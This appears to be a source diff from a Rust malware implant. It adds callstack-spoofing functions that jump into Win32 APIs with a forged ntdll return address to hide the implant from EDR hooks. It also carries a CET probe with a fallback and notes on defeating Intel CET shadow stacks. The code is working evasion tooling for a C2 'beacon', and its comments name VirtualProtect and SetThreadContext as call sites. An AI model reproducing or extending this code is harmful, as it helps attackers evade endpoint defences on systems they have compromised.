@@ -178,10 +178,418 @@ struct ImageSectionHeader {
     _characteristics: u32,
 }
 
+// ---- Spoofed-call primitives ----------------------------------------------
+//
+// What the docstring above promises: a `call_with_spoofed_return` entry point
+// that calls a Win32/x64 target while leaving a *forged* return address on the
+// stack — pointing at the ntdll `ADD RSP, imm8; RET` stub we scanned above.
+// An EDR inline hook that walks `[RSP]` to audit the caller will see
+// `ntdll!something+0xNN` instead of an address in implant (unbacked/RWX)
+// memory, defeating the most common "anomalous dynamic API call" heuristic.
+//
+// # Implementation notes (DoomSyscalls / SilentisVox pattern)
+//
+// The mechanism, as documented across DoomSyscalls, Outflank's BOF post and
+// the r/netsec "CET-compliant callstack spoofing" write-up:
+//
+//   * we cannot `call target` — that pushes OUR return address and, on CET
+//     hardware, also pushes a shadow-stack entry whose RET target must match.
+//   * so we `jmp target` after manually pushing the fake return address. A JMP
+//     neither touches the real stack (beyond our explicit push) nor the shadow
+//     stack. The target fn's prologue/epilogue is none the wiser — it sees a
+//     normal `[RSP]` return slot, just one that happens to point at ntdll.
+//   * the target's RET pops the fake addr → control lands at the stub. The
+//     stub `ADD RSP, imm8` slides past a spacer we planted, then RETs to the
+//     REAL return address (the one that resumes `call_with_spoofed_return`'s
+//     caller). We provide both the spacer and the real RA ourselves.
+//
+// # CET — the hard limitation
+//
+// On Intel CET (shadow-stack) hardware with the process opted into HSP, the
+// target fn's `ret` compares the popped real-stack return address with the
+// top of the shadow stack. The shadow stack only ever sees real CALL/RET
+// pairs; since we JMPed in (no shadow push) the top-of-shadow is the RA of
+// `call_with_spoofed_return`'s own caller — NOT the fake stub addr. This is a
+// mismatch → `#CP` (control-flow exception) → process is terminated.
+//
+// Properly reconciling this needs either `incsspq`/`wrssq` shadow-stack
+// surgery or a constructed IRET_FRAME (call + align the shadow stack across a
+// crafted frame). Both are substantial and out of scope for this pass; see
+// `call_with_iret_frame` below for the TODO + design notes.
+//
+// Until the CET variant lands, `call_with_spoofed_return` performs an honest
+// runtime CET probe and, if CET is on, *degrades to a plain call* (no spoofing)
+// rather than crashing the beacon. Spoofing off + beacon alive beats spoofing
+// on + #CP kill. The fallback is logged via the diagnostic pin (see `diag`
+// gating in blind_hwbp — currently inert in production).
+
+/// Win64 feature constant for `IsProcessorFeaturePresent`: Intel CET shadow
+/// stack (Hardware-enforced Stack Protection). Documented in winnt.h as
+/// `PF_RETURN_CONTROL_ENFORCE` (value 41).
+const PF_CET_SHADOW_STACK: u32 = 41;
+
+/// Probe whether this process runs under Intel CET hardware-enforced shadow
+/// stack (HSP). Resolves `kernel32!IsProcessorFeaturePresent` via the PEB walk
+/// and queries feature 41. Returns `false` on any resolution failure (fail
+/// OPEN — assume CET is off, so the spoof path is still attempted; a #CP there
+/// would be loud, but a missing kernel32 export is far more likely than a
+/// silently-on CET).
+///
+/// # Safety
+/// Must run after PEB-walk bootstrap.
+pub unsafe fn is_cet_enabled() -> bool {
+    // Prefer kernel32 (always exports IsProcessorFeaturePresent on >= NT 6.1).
+    let addr = crate::resolve::export_addr(b"kernel32.dll", b"IsProcessorFeaturePresent")
+        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"IsProcessorFeaturePresent"));
+    let Some(addr) = addr else {
+        return false;
+    };
+    type FnIsPresent = unsafe extern "system" fn(u32) -> i32;
+    let f: FnIsPresent = core::mem::transmute(addr);
+    f(PF_CET_SHADOW_STACK) != 0
+}
+
+/// Call a target function with a spoofed return address pointing into a
+/// system DLL (the `ADD RSP, imm8; RET` stub from `scan_return_stub`).
+///
+/// Up to 4 register arguments (Win64 RCX/RDX/R8/R9) are supported; extra args
+/// beyond the 4th are intentionally NOT handled (the call sites we care about
+/// — `AddVectoredExceptionHandler`, `VirtualProtect`, `SetThreadContext` —
+/// each take <=4). 0/1/2/3-arg calls: pass 0 for the unused slots.
+///
+/// # Return value
+/// The target's RAX (as `usize`). For void Win32 fns the value is ignored; for
+/// handle/BOOL returns it is the real result.
+///
+/// # Safety
+/// * `stub` must come from `scan_return_stub()` (a real `ADD RSP, imm8; RET`
+///   in ntdll) — any other gadget corrupts RSP and crashes.
+/// * `target` must be the address of a Win64-callable fn whose arity matches
+///   the number of `a1..a4` slots actually meaningful.
+/// * Must NOT be used on CET-enabled processes (it will `#CP`); the function
+///   self-gates and falls back to a plain call when `is_cet_enabled()` is true.
+/// * Caller must ensure the target fn does not unwind (panic/SEH) — there is
+///   no real Rust frame on the path the unwinder would walk through the stub.
+#[inline(never)]
+pub unsafe fn call_with_spoofed_return(
+    stub: ReturnStub,
+    target: usize,
+    a1: usize,
+    a2: usize,
+    a3: usize,
+    a4: usize,
+) -> usize {
+    // Hard safety gate. Spoofing on CET = #CP = beacon dies. Degrade to a
+    // plain call (no spoof) instead: the EDR audit sees implant memory as the
+    // caller, but the beacon survives. This is the documented "honest fallback"
+    // — and matches how BRC4 / DoomSyscalls handle the same case pre-IRET.
+    if is_cet_enabled() {
+        return call_plain(target, a1, a2, a3, a4);
+    }
+
+    // ---- Stack layout we must hand to the target ----
+    //
+    // We have to reason carefully about TWO stack-pointer positions:
+    //   R0 = RSP at the moment we `jmp {target}` (= original RSP - reserve)
+    //   R1 = RSP immediately after the target fn's `ret` (which pops [R0])
+    //      = R0 + 8
+    //
+    // The target sees, at R0:
+    //   [R0]     = return address           ← we put the FAKE one (stub.addr)
+    //   [R0+0x08]..[R0+0x28] = 32-byte Win64 shadow store  ← callee may clobber.
+    //
+    // After `ret` the target pops [R0] (= stub.addr) → RSP becomes R1 = R0 + 8.
+    // The stub is `ADD RSP, imm8; RET`, so from R1 it does RSP += stack_clean
+    // and then pops the NEXT qword as ITS return address. We must plant the
+    // REAL return address (the instruction after the JMP) so that
+    //
+    //     R1 + stack_clean  ==  &real_RA
+    //   ⟺  R0 + 8 + stack_clean  ==  &real_RA
+    //   ⟺  real_RA offset (relative to R0)  =  8 + stack_clean
+    //
+    // Layout (offsets relative to R0):
+    //
+    //   [R0 + 0]                = fake RA   (stub.addr)         target RETs here
+    //   [R0 + 8]                : 32-byte Win64 shadow space    — don't care
+    //   [R0 + 0x28]             : gap of (stack_clean - 0x20) B — don't care
+    //   [R0 + 8 + stack_clean]  = real RA                        stub RETs here
+    //
+    // For stack_clean < 0x28 (i.e. 8/16/24) the real RA would land INSIDE the
+    // 32-byte shadow space the callee is entitled to clobber — we'd corrupt a
+    // spill slot. We require stack_clean >= 0x28.
+    //
+    // Alignment: Win64 requires RSP at the target entry (R0) to be 16-aligned.
+    // The asm block enters with a 16-aligned RSP (compiler guarantee); after
+    // `sub rsp, reserve`, alignment flips by (reserve mod 16). We therefore
+    // need `reserve mod 16 == 0`. The minimal reserve is `stack_clean + 16`
+    // (fake RA + gap + real RA). For this to be a multiple of 16 with no extra
+    // padding needed, `stack_clean` must be a multiple of 16. (stack_clean is
+    // always a multiple of 8 by the scanner contract.) We reject stubs whose
+    // imm8 is 8 mod 16 — they'd require dynamic padding, complicating the
+    // restore path. ntdll has plenty of 16-multiple stubs; the rare bad one
+    // degrades to an honest call.
+    //
+    // With both constraints met (stack_clean multiple of 16, >= 0x28), the
+    // net reserve is `stack_clean + 16`, a multiple of 16, AND the post-stub
+    // RSP returns EXACTLY to entry-RSP (no add needed at the restore label):
+    //   entry RSP - reserve + (8 + stack_clean + 8)   [pops + stub ADD]
+    //   = entry RSP - (stack_clean + 16) + stack_clean + 16
+    //   = entry RSP.
+    let stack_clean = stub.stack_clean as usize;
+    // `manual_is_multiple_of` prefers `is_multiple_of` (stable 1.87+); we keep
+    // `%` for parity with `lacuna.rs:45` and the rest of this no_std crate.
+    #[allow(clippy::manual_is_multiple_of)]
+    if stack_clean < 0x28 || stack_clean % 16 != 0 {
+        // Stub pops too little OR is not 16-aligned: real RA would collide
+        // with the callee-owned shadow space, or we'd need dynamic restore
+        // padding. Fall back to an honest, non-spoofed call.
+        return call_plain(target, a1, a2, a3, a4);
+    }
+
+    let reserve = stack_clean + 16;
+    let real_ra_off = stack_clean + 8; // real RA at [R0 + 8 + stack_clean]
+
+    let result: usize;
+    let stub_addr = stub.addr;
+    // Argument passing: we bind a1..a4 DIRECTLY to their Win64 home registers
+    // via `in("rcx")` etc. (not `in(reg)` + a `mov rcx,{a1}`), because the
+    // `mov` form forces the compiler to find a SEPARATE scratch register for
+    // each arg AND for reserve/real_ra_off/stub/target — on x86_64 Windows we
+    // run out of volatile registers and hit "more registers than available".
+    // Direct binding lets the compiler load args into RCX/RDX/R8/R9 up front.
+    //
+    // `scratch` (rax) is reserved for the LEA that captures the real RA — we
+    // can use rax freely here because the target fn will clobber it anyway and
+    // we capture the result via `out("rax") result` AFTER the call returns.
+    core::arch::asm!(
+        // 1. Reserve the frame.
+        "sub rsp, {reserve}",
+
+        // 2. Plant the FAKE return address at [RSP] (= stub.addr).
+        "mov qword ptr [rsp], {stub}",
+
+        // 3. Plant the REAL return address at [RSP + real_ra_off].
+        //    LEA a RIP-relative pointer to label `2:` below and store it. We
+        //    use rax as scratch (it's clobbered by the target anyway).
+        //    NOTE: Rust asm! forbids named labels (lint `asm_labels`) and
+        //    labels starting with 0 or 1; `2:` with `2f` (forward reference)
+        //    is the documented form. Numeric labels are block-local, so
+        //    monomorphization/inlining can never collide them.
+        "lea rax, [rip + 2f]",
+        "mov qword ptr [rsp + {real_ra_off}], rax",
+
+        // 4. JMP to the target. NOT `call` — a call would (a) push our real RA
+        //    (defeating the spoof) and (b) push a shadow-stack entry that the
+        //    target's RET would then mismatch on CET hardware. RSP (= R0) is
+        //    16-aligned here: entry RSP was 16-aligned (compiler guarantee at
+        //    the asm boundary) and we subtracted `reserve` (a multiple of 16).
+        //    Win64 args RCX/RDX/R8/R9 are already in place (see in() bindings).
+        "jmp {target}",
+
+        // 5. Real return address — the stub's `RET` lands here. By construction
+        //    (see the layout comment above) the target RET (+8) + stub ADD
+        //    RSP,stack_clean + stub RET (+8) brings RSP EXACTLY back to the
+        //    asm-entry RSP. No restore `add rsp` is needed — the stub has
+        //    already unwound the whole frame for us. RAX holds the target's
+        //    return value (Win64 ABI); we capture it via `out("rax") result`.
+        "2:",
+
+        reserve = in(reg) reserve,
+        real_ra_off = in(reg) real_ra_off,
+        stub = in(reg) stub_addr,
+        target = in(reg) target,
+        in("rcx") a1,
+        in("rdx") a2,
+        in("r8") a3,
+        in("r9") a4,
+        out("rax") result,
+        out("r10") _,
+        out("r11") _,
+    );
+    result
+}
+
+/// Plain (non-spoofed) Win64 call. Used as the honest fallback when CET is on
+/// or when the scanned stub has an unsupported stack_clean. Result in RAX.
+///
+/// This is a deliberately thin `asm!` wrapper around an indirect call — no
+/// spoofing, no frame trickery. The compiler handles RSP alignment for us via
+/// the standard `call` semantics.
+unsafe fn call_plain(target: usize, a1: usize, a2: usize, a3: usize, a4: usize) -> usize {
+    let result: usize;
+    core::arch::asm!(
+        "mov rcx, {a1}",
+        "mov rdx, {a2}",
+        "mov r8,  {a3}",
+        "mov r9,  {a4}",
+        "call {target}",
+        a1 = in(reg) a1,
+        a2 = in(reg) a2,
+        a3 = in(reg) a3,
+        a4 = in(reg) a4,
+        target = in(reg) target,
+        out("rax") result,
+        out("rcx") _,
+        out("rdx") _,
+        out("r8") _,
+        out("r9") _,
+        out("r10") _,
+        out("r11") _,
+    );
+    result
+}
+
+// ---- CET path: IRET-frame construction (TODO) -----------------------------
+//
+// `call_with_iret_frame` — the CET-safe counterpart. NOT implemented in this
+// pass; this is the documented design for a follow-up. The blocker is that
+// every approach needs either privileged shadow-stack instructions or a
+// carefully-built IRET_FRAME, both of which carry meaningful complexity and
+// need real-hardware test (we have no CET QEMU image in CI today).
+//
+// # Sketch (three viable strategies, by complexity)
+//
+// 1. **Shadow-stack surgery via `wrssq`/`incsspq`** (privileged on most OSes;
+//    user-mode `wrssq` requires `CR4.CET` + the process to be CET-enabled,
+//    which is precisely when we'd need it — but Windows currently does NOT
+//    expose user-mode `wrssq`; it manages the shadow stack from kernel mode).
+//    Not viable on stock Windows 10/11 as of 2026-07. Listed for completeness.
+//
+// 2. **IRET_FRAME swap** (the classical CheatProgrammer / LoneW01f approach):
+//    build a fake IRET_FRAME on the stack (RIP=target, CS=0x33, RFLAGS, RSP,
+//    SS=0x2B), then `iretq` into the target. IRET does NOT push a shadow-stack
+//    entry, so the target fn's `ret` matches the shadow stack at the point of
+//    the *previous* real call. After the target RETs we land at... whatever
+//    was there. To return to US, we plant our real RA on the IRET_FRAME's
+//    stack. The mechanics:
+//      a. allocate a small fake stack region (per-thread, reused).
+//      b. write IRET_FRAME: RIP=target, CS=0x33, RFLAGS=read via pushfq, RSP
+//         = (fake stack top - 8) where [fake stack top - 8] = real RA.
+//      c. `pushfq; pop rax` to capture RFLAGS, mask IF appropriately.
+//      d. `iretq` — transfers to target with the fake stack + shadow stack
+//         unchanged. Target RETs into real RA on the FAKE stack.
+//      e. real RA lands us back in this fn; restore the real stack pointer.
+//    Subtleties: iretq from ring-3 to ring-3 doesn't switch stacks; SS:RSP
+//    come from the frame. CS must be 0x33 (64-bit user code). RPL etc.
+//    This WORKS on stock Win10/11 + CET, per the r/netsec write-up (result #1
+//    from the WebSearch). Implement after a CET-capable test VM exists.
+//
+// 3. **Thread-pool / Enum-system-callback detour** (the r/netsec "CET-compliant
+//    callstack spoofing via Thread Pool & Enum Callback" technique): instead
+//    of spoofing inline, queue an APC / threadpool work item whose CALLER is
+//    a legitimate ntdll!Tp... or Enum* function. The callback runs with a
+//    real, CET-clean call stack rooted in ntdll. No asm trickery needed; cost
+//    is async semantics (caller must wait on an event) + the callback's args
+//    are constrained. Most robust of the three; worst fit-for-purpose for
+//    synchronous VEH registration.
+//
+// # Recommended next step
+// Implement strategy 2 (IRET_FRAME) behind a `#[cfg(feature = "cet_spoof")]`
+// gate, with a hard `is_cet_enabled()` gate at entry and an unconditional
+// fallback to `call_plain` if the IRET path fails. Test on Intel Tiger Lake
+// or newer with HSP enabled (Win11 22H2+ default for compatible processes).
+//
+// Until then: `call_with_spoofed_return` self-gates and degrades; this TODO
+// is the tracking note for closing the CET gap.
+/// Call a target with a CET-safe spoofed return (constructed IRET_FRAME).
+///
+/// NOT YET IMPLEMENTED — currently degrades unconditionally to `call_plain`
+/// (no spoofing). See the large comment block above for the design of the
+/// three viable CET strategies (shadow-stack surgery, IRET_FRAME swap,
+/// thread-pool detour). Tracked as TODO(CET).
+///
+/// # Safety
+/// Same contract as [`call_with_spoofed_return`]: `target` must be a Win64-
+/// callable fn of arity <= 4, and the target must not unwind. Until the IRET
+/// implementation lands this is exactly as safe as `call_plain` (it IS
+/// `call_plain`).
+#[allow(dead_code)]
+pub unsafe fn call_with_iret_frame(
+    _stub: ReturnStub,
+    _target: usize,
+    _a1: usize,
+    _a2: usize,
+    _a3: usize,
+    _a4: usize,
+) -> usize {
+    // TODO(CET): implement strategy 2 (IRET_FRAME) per the design notes above.
+    // For now, unconditionally degrade — there is no spoof path that is both
+    // CET-safe and synchronous-inline. Callers that need spoofing on CET must
+    // route through the thread-pool detour (strategy 3) externally.
+    call_plain(_target, _a1, _a2, _a3, _a4)
+}
+
+// ---- Thin macro wrapper (matches the documented `call_with_spoofed_return!`
+// surface so existing doc references resolve) ------------------------------
+//
+// Forwards to the function form. Kept as a macro_rules! purely so the doc
+// example `caller_spoof::call_with_spoofed_return!(...)` keeps working; the
+// function form is preferred for new call sites (cleaner type-checking).
+/// Call `target` with a spoofed ntdll return address. See the function form
+/// [`call_with_spoofed_return`] for the full contract.
+#[macro_export]
+macro_rules! call_with_spoofed_return {
+    ($stub:expr, $target:expr, $a1:expr, $a2:expr, $a3:expr, $a4:expr $(,)?) => {
+        // Delegate to the function; the macro is sugar for the 4-arg form.
+        unsafe {
+            $crate::caller_spoof::call_with_spoofed_return(
+                $stub,
+                $target,
+                $a1 as usize,
+                $a2 as usize,
+                $a3 as usize,
+                $a4 as usize,
+            )
+        }
+    };
+    // 3-arg convenience (most common: AddVectoredExceptionHandler(First, Handler)).
+    ($stub:expr, $target:expr, $a1:expr, $a2:expr $(,)?) => {
+        $crate::call_with_spoofed_return!($stub, $target, $a1, $a2, 0usize, 0usize)
+    };
+    // 1-arg convenience.
+    ($stub:expr, $target:expr, $a1:expr $(,)?) => {
+        $crate::call_with_spoofed_return!($stub, $target, $a1, 0usize, 0usize, 0usize)
+    };
+    // 0-arg convenience.
+    ($stub:expr, $target:expr $(,)?) => {
+        $crate::call_with_spoofed_return!($stub, $target, 0usize, 0usize, 0usize, 0usize)
+    };
+}
+
 // ---- Selftest support -----------------------------------------------------
 
 /// Self-test: scan for a return stub in ntdll and verify it's valid.
 /// Returns `true` if a stub was found with a plausible address in ntdll.
 pub fn selftest_stub() -> bool {
     unsafe { scan_return_stub().is_some() }
+}
+
+/// Self-test for the spoofed-call SUBSYSTEM (not the call itself — invoking
+/// `call_with_spoofed_return` against a real Win32 fn belongs in
+/// `selftests.rs` under the `selftest` feature, gated on a Windows host).
+///
+/// This probes only the safe, read-only preconditions:
+///  * a return stub was found in ntdll,
+///  * the stub meets our `stack_clean >= 0x28 && % 16 == 0` requirement,
+///  * CET status on this host (which determines whether the spoof path would
+///    run or degrade to `call_plain`).
+///
+/// Returns a packed status bitmask:
+///   bit 0 (1)  = a return stub was found
+///   bit 1 (2)  = the stub has stack_clean >= 0x28 and % 16 == 0 (usable)
+///   bit 2 (4)  = CET is enabled on this host (spoof path would degrade)
+pub fn selftest_spoof_path() -> u8 {
+    let mut flags: u8 = 0;
+    if let Some(s) = unsafe { scan_return_stub() } {
+        flags |= 1;
+        let sc = s.stack_clean as usize;
+        #[allow(clippy::manual_is_multiple_of)]
+        if sc >= 0x28 && sc % 16 == 0 {
+            flags |= 2;
+        }
+    }
+    if unsafe { is_cet_enabled() } {
+        flags |= 4;
+    }
+    flags
 }
